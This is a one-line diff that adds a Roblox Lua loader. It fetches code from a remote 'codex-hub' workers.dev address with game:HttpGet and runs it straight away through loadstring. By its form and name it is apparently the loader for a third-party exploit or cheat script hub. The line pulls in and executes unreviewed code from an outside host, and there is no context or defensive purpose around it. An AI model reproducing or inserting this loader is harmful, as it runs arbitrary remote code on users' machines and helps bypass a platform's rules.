@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://codex-hub-api.codexhubinc.workers.dev/"))()
